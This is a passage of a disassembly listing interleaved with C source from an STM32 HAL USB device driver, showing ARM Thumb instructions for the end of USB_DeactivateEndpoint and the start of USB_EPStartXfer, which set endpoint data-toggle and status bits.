 80065c8:	81bb      	strh	r3, [r7, #12]
 80065ca:	89bb      	ldrh	r3, [r7, #12]
 80065cc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80065d0:	2b00      	cmp	r3, #0
 80065d2:	d01b      	beq.n	800660c <USB_DeactivateEndpoint+0x6c>
 80065d4:	687a      	ldr	r2, [r7, #4]
 80065d6:	683b      	ldr	r3, [r7, #0]
 80065d8:	781b      	ldrb	r3, [r3, #0]
 80065da:	009b      	lsls	r3, r3, #2
 80065dc:	4413      	add	r3, r2
 80065de:	881b      	ldrh	r3, [r3, #0]
 80065e0:	b29b      	uxth	r3, r3
 80065e2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065e6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065ea:	817b      	strh	r3, [r7, #10]
 80065ec:	687a      	ldr	r2, [r7, #4]
 80065ee:	683b      	ldr	r3, [r7, #0]
 80065f0:	781b      	ldrb	r3, [r3, #0]
 80065f2:	009b      	lsls	r3, r3, #2
 80065f4:	441a      	add	r2, r3
 80065f6:	897b      	ldrh	r3, [r7, #10]
 80065f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006600:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006604:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006608:	b29b      	uxth	r3, r3
 800660a:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800660c:	687a      	ldr	r2, [r7, #4]
 800660e:	683b      	ldr	r3, [r7, #0]
 8006610:	781b      	ldrb	r3, [r3, #0]
 8006612:	009b      	lsls	r3, r3, #2
 8006614:	4413      	add	r3, r2
 8006616:	881b      	ldrh	r3, [r3, #0]
 8006618:	b29b      	uxth	r3, r3
 800661a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800661e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006622:	813b      	strh	r3, [r7, #8]
 8006624:	687a      	ldr	r2, [r7, #4]
 8006626:	683b      	ldr	r3, [r7, #0]
 8006628:	781b      	ldrb	r3, [r3, #0]
 800662a:	009b      	lsls	r3, r3, #2
 800662c:	441a      	add	r2, r3
 800662e:	893b      	ldrh	r3, [r7, #8]
 8006630:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006634:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006638:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800663c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006640:	b29b      	uxth	r3, r3
 8006642:	8013      	strh	r3, [r2, #0]
 8006644:	e192      	b.n	800696c <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006646:	687a      	ldr	r2, [r7, #4]
 8006648:	683b      	ldr	r3, [r7, #0]
 800664a:	781b      	ldrb	r3, [r3, #0]
 800664c:	009b      	lsls	r3, r3, #2
 800664e:	4413      	add	r3, r2
 8006650:	881b      	ldrh	r3, [r3, #0]
 8006652:	827b      	strh	r3, [r7, #18]
 8006654:	8a7b      	ldrh	r3, [r7, #18]
 8006656:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800665a:	2b00      	cmp	r3, #0
 800665c:	d01b      	beq.n	8006696 <USB_DeactivateEndpoint+0xf6>
 800665e:	687a      	ldr	r2, [r7, #4]
 8006660:	683b      	ldr	r3, [r7, #0]
 8006662:	781b      	ldrb	r3, [r3, #0]
 8006664:	009b      	lsls	r3, r3, #2
 8006666:	4413      	add	r3, r2
 8006668:	881b      	ldrh	r3, [r3, #0]
 800666a:	b29b      	uxth	r3, r3
 800666c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006670:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006674:	823b      	strh	r3, [r7, #16]
 8006676:	687a      	ldr	r2, [r7, #4]
 8006678:	683b      	ldr	r3, [r7, #0]
 800667a:	781b      	ldrb	r3, [r3, #0]
 800667c:	009b      	lsls	r3, r3, #2
 800667e:	441a      	add	r2, r3
 8006680:	8a3b      	ldrh	r3, [r7, #16]
 8006682:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006686:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800668a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800668e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006692:	b29b      	uxth	r3, r3
 8006694:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006696:	687a      	ldr	r2, [r7, #4]
 8006698:	683b      	ldr	r3, [r7, #0]
 800669a:	781b      	ldrb	r3, [r3, #0]
 800669c:	009b      	lsls	r3, r3, #2
 800669e:	4413      	add	r3, r2
 80066a0:	881b      	ldrh	r3, [r3, #0]
 80066a2:	b29b      	uxth	r3, r3
 80066a4:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80066a8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066ac:	81fb      	strh	r3, [r7, #14]
 80066ae:	687a      	ldr	r2, [r7, #4]
 80066b0:	683b      	ldr	r3, [r7, #0]
 80066b2:	781b      	ldrb	r3, [r3, #0]
 80066b4:	009b      	lsls	r3, r3, #2
 80066b6:	441a      	add	r2, r3
 80066b8:	89fb      	ldrh	r3, [r7, #14]
 80066ba:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066be:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066c2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066c6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066ca:	b29b      	uxth	r3, r3
 80066cc:	8013      	strh	r3, [r2, #0]
 80066ce:	e14d      	b.n	800696c <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 80066d0:	683b      	ldr	r3, [r7, #0]
 80066d2:	785b      	ldrb	r3, [r3, #1]
 80066d4:	2b00      	cmp	r3, #0
 80066d6:	f040 80a5 	bne.w	8006824 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80066da:	687a      	ldr	r2, [r7, #4]
 80066dc:	683b      	ldr	r3, [r7, #0]
 80066de:	781b      	ldrb	r3, [r3, #0]
 80066e0:	009b      	lsls	r3, r3, #2
 80066e2:	4413      	add	r3, r2
 80066e4:	881b      	ldrh	r3, [r3, #0]
 80066e6:	843b      	strh	r3, [r7, #32]
 80066e8:	8c3b      	ldrh	r3, [r7, #32]
 80066ea:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80066ee:	2b00      	cmp	r3, #0
 80066f0:	d01b      	beq.n	800672a <USB_DeactivateEndpoint+0x18a>
 80066f2:	687a      	ldr	r2, [r7, #4]
 80066f4:	683b      	ldr	r3, [r7, #0]
 80066f6:	781b      	ldrb	r3, [r3, #0]
 80066f8:	009b      	lsls	r3, r3, #2
 80066fa:	4413      	add	r3, r2
 80066fc:	881b      	ldrh	r3, [r3, #0]
 80066fe:	b29b      	uxth	r3, r3
 8006700:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006704:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006708:	83fb      	strh	r3, [r7, #30]
 800670a:	687a      	ldr	r2, [r7, #4]
 800670c:	683b      	ldr	r3, [r7, #0]
 800670e:	781b      	ldrb	r3, [r3, #0]
 8006710:	009b      	lsls	r3, r3, #2
 8006712:	441a      	add	r2, r3
 8006714:	8bfb      	ldrh	r3, [r7, #30]
 8006716:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800671a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800671e:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006722:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006726:	b29b      	uxth	r3, r3
 8006728:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800672a:	687a      	ldr	r2, [r7, #4]
 800672c:	683b      	ldr	r3, [r7, #0]
 800672e:	781b      	ldrb	r3, [r3, #0]
 8006730:	009b      	lsls	r3, r3, #2
 8006732:	4413      	add	r3, r2
 8006734:	881b      	ldrh	r3, [r3, #0]
 8006736:	83bb      	strh	r3, [r7, #28]
 8006738:	8bbb      	ldrh	r3, [r7, #28]
 800673a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800673e:	2b00      	cmp	r3, #0
 8006740:	d01b      	beq.n	800677a <USB_DeactivateEndpoint+0x1da>
 8006742:	687a      	ldr	r2, [r7, #4]
 8006744:	683b      	ldr	r3, [r7, #0]
 8006746:	781b      	ldrb	r3, [r3, #0]
 8006748:	009b      	lsls	r3, r3, #2
 800674a:	4413      	add	r3, r2
 800674c:	881b      	ldrh	r3, [r3, #0]
 800674e:	b29b      	uxth	r3, r3
 8006750:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006754:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006758:	837b      	strh	r3, [r7, #26]
 800675a:	687a      	ldr	r2, [r7, #4]
 800675c:	683b      	ldr	r3, [r7, #0]
 800675e:	781b      	ldrb	r3, [r3, #0]
 8006760:	009b      	lsls	r3, r3, #2
 8006762:	441a      	add	r2, r3
 8006764:	8b7b      	ldrh	r3, [r7, #26]
 8006766:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800676a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800676e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006772:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006776:	b29b      	uxth	r3, r3
 8006778:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 800677a:	687a      	ldr	r2, [r7, #4]
 800677c:	683b      	ldr	r3, [r7, #0]
 800677e:	781b      	ldrb	r3, [r3, #0]
 8006780:	009b      	lsls	r3, r3, #2
 8006782:	4413      	add	r3, r2
 8006784:	881b      	ldrh	r3, [r3, #0]
 8006786:	b29b      	uxth	r3, r3
 8006788:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800678c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006790:	833b      	strh	r3, [r7, #24]
 8006792:	687a      	ldr	r2, [r7, #4]
 8006794:	683b      	ldr	r3, [r7, #0]
 8006796:	781b      	ldrb	r3, [r3, #0]
 8006798:	009b      	lsls	r3, r3, #2
 800679a:	441a      	add	r2, r3
 800679c:	8b3b      	ldrh	r3, [r7, #24]
 800679e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067a2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067a6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067aa:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80067ae:	b29b      	uxth	r3, r3
 80067b0:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80067b2:	687a      	ldr	r2, [r7, #4]
 80067b4:	683b      	ldr	r3, [r7, #0]
 80067b6:	781b      	ldrb	r3, [r3, #0]
 80067b8:	009b      	lsls	r3, r3, #2
 80067ba:	4413      	add	r3, r2
 80067bc:	881b      	ldrh	r3, [r3, #0]
 80067be:	b29b      	uxth	r3, r3
 80067c0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80067c4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067c8:	82fb      	strh	r3, [r7, #22]
 80067ca:	687a      	ldr	r2, [r7, #4]
 80067cc:	683b      	ldr	r3, [r7, #0]
 80067ce:	781b      	ldrb	r3, [r3, #0]
 80067d0:	009b      	lsls	r3, r3, #2
 80067d2:	441a      	add	r2, r3
 80067d4:	8afb      	ldrh	r3, [r7, #22]
 80067d6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067da:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067de:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067e2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067e6:	b29b      	uxth	r3, r3
 80067e8:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80067ea:	687a      	ldr	r2, [r7, #4]
 80067ec:	683b      	ldr	r3, [r7, #0]
 80067ee:	781b      	ldrb	r3, [r3, #0]
 80067f0:	009b      	lsls	r3, r3, #2
 80067f2:	4413      	add	r3, r2
 80067f4:	881b      	ldrh	r3, [r3, #0]
 80067f6:	b29b      	uxth	r3, r3
 80067f8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067fc:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006800:	82bb      	strh	r3, [r7, #20]
 8006802:	687a      	ldr	r2, [r7, #4]
 8006804:	683b      	ldr	r3, [r7, #0]
 8006806:	781b      	ldrb	r3, [r3, #0]
 8006808:	009b      	lsls	r3, r3, #2
 800680a:	441a      	add	r2, r3
 800680c:	8abb      	ldrh	r3, [r7, #20]
 800680e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006812:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006816:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800681a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800681e:	b29b      	uxth	r3, r3
 8006820:	8013      	strh	r3, [r2, #0]
 8006822:	e0a3      	b.n	800696c <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006824:	687a      	ldr	r2, [r7, #4]
 8006826:	683b      	ldr	r3, [r7, #0]
 8006828:	781b      	ldrb	r3, [r3, #0]
 800682a:	009b      	lsls	r3, r3, #2
 800682c:	4413      	add	r3, r2
 800682e:	881b      	ldrh	r3, [r3, #0]
 8006830:	85fb      	strh	r3, [r7, #46]	; 0x2e
 8006832:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 8006834:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006838:	2b00      	cmp	r3, #0
 800683a:	d01b      	beq.n	8006874 <USB_DeactivateEndpoint+0x2d4>
 800683c:	687a      	ldr	r2, [r7, #4]
 800683e:	683b      	ldr	r3, [r7, #0]
 8006840:	781b      	ldrb	r3, [r3, #0]
 8006842:	009b      	lsls	r3, r3, #2
 8006844:	4413      	add	r3, r2
 8006846:	881b      	ldrh	r3, [r3, #0]
 8006848:	b29b      	uxth	r3, r3
 800684a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800684e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006852:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006854:	687a      	ldr	r2, [r7, #4]
 8006856:	683b      	ldr	r3, [r7, #0]
 8006858:	781b      	ldrb	r3, [r3, #0]
 800685a:	009b      	lsls	r3, r3, #2
 800685c:	441a      	add	r2, r3
 800685e:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 8006860:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006864:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006868:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800686c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006870:	b29b      	uxth	r3, r3
 8006872:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006874:	687a      	ldr	r2, [r7, #4]
 8006876:	683b      	ldr	r3, [r7, #0]
 8006878:	781b      	ldrb	r3, [r3, #0]
 800687a:	009b      	lsls	r3, r3, #2
 800687c:	4413      	add	r3, r2
 800687e:	881b      	ldrh	r3, [r3, #0]
 8006880:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006882:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006884:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006888:	2b00      	cmp	r3, #0
 800688a:	d01b      	beq.n	80068c4 <USB_DeactivateEndpoint+0x324>
 800688c:	687a      	ldr	r2, [r7, #4]
 800688e:	683b      	ldr	r3, [r7, #0]
 8006890:	781b      	ldrb	r3, [r3, #0]
 8006892:	009b      	lsls	r3, r3, #2
 8006894:	4413      	add	r3, r2
 8006896:	881b      	ldrh	r3, [r3, #0]
 8006898:	b29b      	uxth	r3, r3
 800689a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800689e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068a2:	853b      	strh	r3, [r7, #40]	; 0x28
 80068a4:	687a      	ldr	r2, [r7, #4]
 80068a6:	683b      	ldr	r3, [r7, #0]
 80068a8:	781b      	ldrb	r3, [r3, #0]
 80068aa:	009b      	lsls	r3, r3, #2
 80068ac:	441a      	add	r2, r3
 80068ae:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 80068b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068b8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068bc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80068c0:	b29b      	uxth	r3, r3
 80068c2:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 80068c4:	687a      	ldr	r2, [r7, #4]
 80068c6:	683b      	ldr	r3, [r7, #0]
 80068c8:	781b      	ldrb	r3, [r3, #0]
 80068ca:	009b      	lsls	r3, r3, #2
 80068cc:	4413      	add	r3, r2
 80068ce:	881b      	ldrh	r3, [r3, #0]
 80068d0:	b29b      	uxth	r3, r3
 80068d2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068d6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068da:	84fb      	strh	r3, [r7, #38]	; 0x26
 80068dc:	687a      	ldr	r2, [r7, #4]
 80068de:	683b      	ldr	r3, [r7, #0]
 80068e0:	781b      	ldrb	r3, [r3, #0]
 80068e2:	009b      	lsls	r3, r3, #2
 80068e4:	441a      	add	r2, r3
 80068e6:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 80068e8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068ec:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068f0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80068f4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068f8:	b29b      	uxth	r3, r3
 80068fa:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80068fc:	687a      	ldr	r2, [r7, #4]
 80068fe:	683b      	ldr	r3, [r7, #0]
 8006900:	781b      	ldrb	r3, [r3, #0]
 8006902:	009b      	lsls	r3, r3, #2
 8006904:	4413      	add	r3, r2
 8006906:	881b      	ldrh	r3, [r3, #0]
 8006908:	b29b      	uxth	r3, r3
 800690a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800690e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006912:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006914:	687a      	ldr	r2, [r7, #4]
 8006916:	683b      	ldr	r3, [r7, #0]
 8006918:	781b      	ldrb	r3, [r3, #0]
 800691a:	009b      	lsls	r3, r3, #2
 800691c:	441a      	add	r2, r3
 800691e:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 8006920:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006924:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006928:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800692c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006930:	b29b      	uxth	r3, r3
 8006932:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006934:	687a      	ldr	r2, [r7, #4]
 8006936:	683b      	ldr	r3, [r7, #0]
 8006938:	781b      	ldrb	r3, [r3, #0]
 800693a:	009b      	lsls	r3, r3, #2
 800693c:	4413      	add	r3, r2
 800693e:	881b      	ldrh	r3, [r3, #0]
 8006940:	b29b      	uxth	r3, r3
 8006942:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006946:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800694a:	847b      	strh	r3, [r7, #34]	; 0x22
 800694c:	687a      	ldr	r2, [r7, #4]
 800694e:	683b      	ldr	r3, [r7, #0]
 8006950:	781b      	ldrb	r3, [r3, #0]
 8006952:	009b      	lsls	r3, r3, #2
 8006954:	441a      	add	r2, r3
 8006956:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006958:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800695c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006960:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006964:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006968:	b29b      	uxth	r3, r3
 800696a:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 800696c:	2300      	movs	r3, #0
}
 800696e:	4618      	mov	r0, r3
 8006970:	3734      	adds	r7, #52	; 0x34
 8006972:	46bd      	mov	sp, r7
 8006974:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006978:	4770      	bx	lr

0800697a <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800697a:	b580      	push	{r7, lr}
 800697c:	b0c2      	sub	sp, #264	; 0x108
 800697e:	af00      	add	r7, sp, #0
 8006980:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006984:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006988:	6018      	str	r0, [r3, #0]
 800698a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800698e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006992:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006994:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006998:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800699c:	681b      	ldr	r3, [r3, #0]
 800699e:	785b      	ldrb	r3, [r3, #1]
 80069a0:	2b01      	cmp	r3, #1
 80069a2:	f040 86b7 	bne.w	8007714 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 80069a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80069aa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80069ae:	681b      	ldr	r3, [r3, #0]
 80069b0:	699a      	ldr	r2, [r3, #24]
 80069b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80069b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80069ba:	681b      	ldr	r3, [r3, #0]
 80069bc:	691b      	ldr	r3, [r3, #16]
 80069be:	429a      	cmp	r2, r3
 80069c0:	d908      	bls.n	80069d4 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 80069c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80069c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80069ca:	681b      	ldr	r3, [r3, #0]
 80069cc:	691b      	ldr	r3, [r3, #16]
 80069ce:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 80069d2:	e007      	b.n	80069e4 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 80069d4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80069d8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80069dc:	681b      	ldr	r3, [r3, #0]
 80069de:	699b      	ldr	r3, [r3, #24]
 80069e0:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 80069e4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80069e8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80069ec:	681b      	ldr	r3, [r3, #0]
 80069ee:	7b1b      	ldrb	r3, [r3, #12]
 80069f0:	2b00      	cmp	r3, #0
 80069f2:	d13a      	bne.n	8006a6a <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 80069f4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80069f8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80069fc:	681b      	ldr	r3, [r3, #0]
 80069fe:	6959      	ldr	r1, [r3, #20]
 8006a00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a08:	681b      	ldr	r3, [r3, #0]
 8006a0a:	88da      	ldrh	r2, [r3, #6]
 8006a0c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006a10:	b29b      	uxth	r3, r3
 8006a12:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006a16:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006a1a:	6800      	ldr	r0, [r0, #0]
 8006a1c:	f001 fcb9 	bl	8008392 <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006a20:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a24:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a28:	681b      	ldr	r3, [r3, #0]
 8006a2a:	613b      	str	r3, [r7, #16]
 8006a2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a30:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a34:	681b      	ldr	r3, [r3, #0]
 8006a36:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006a3a:	b29b      	uxth	r3, r3
 8006a3c:	461a      	mov	r2, r3
 8006a3e:	693b      	ldr	r3, [r7, #16]
 8006a40:	4413      	add	r3, r2
 8006a42:	613b      	str	r3, [r7, #16]
 8006a44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a48:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a4c:	681b      	ldr	r3, [r3, #0]
 8006a4e:	781b      	ldrb	r3, [r3, #0]
 8006a50:	00da      	lsls	r2, r3, #3
 8006a52:	693b      	ldr	r3, [r7, #16]
 8006a54:	4413      	add	r3, r2
 8006a56:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006a5a:	60fb      	str	r3, [r7, #12]
 8006a5c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006a60:	b29a      	uxth	r2, r3
 8006a62:	68fb      	ldr	r3, [r7, #12]
 8006a64:	801a      	strh	r2, [r3, #0]
 8006a66:	f000 be1f 	b.w	80076a8 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006a6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a72:	681b      	ldr	r3, [r3, #0]
 8006a74:	78db      	ldrb	r3, [r3, #3]
 8006a76:	2b02      	cmp	r3, #2
 8006a78:	f040 8462 	bne.w	8007340 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006a7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a80:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a84:	681b      	ldr	r3, [r3, #0]
 8006a86:	6a1a      	ldr	r2, [r3, #32]
 8006a88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a90:	681b      	ldr	r3, [r3, #0]
 8006a92:	691b      	ldr	r3, [r3, #16]
 8006a94:	429a      	cmp	r2, r3
 8006a96:	f240 83df 	bls.w	8007258 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006a9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a9e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006aa2:	681a      	ldr	r2, [r3, #0]
 8006aa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006aa8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aac:	681b      	ldr	r3, [r3, #0]
 8006aae:	781b      	ldrb	r3, [r3, #0]
 8006ab0:	009b      	lsls	r3, r3, #2
 8006ab2:	4413      	add	r3, r2
 8006ab4:	881b      	ldrh	r3, [r3, #0]
 8006ab6:	b29b      	uxth	r3, r3
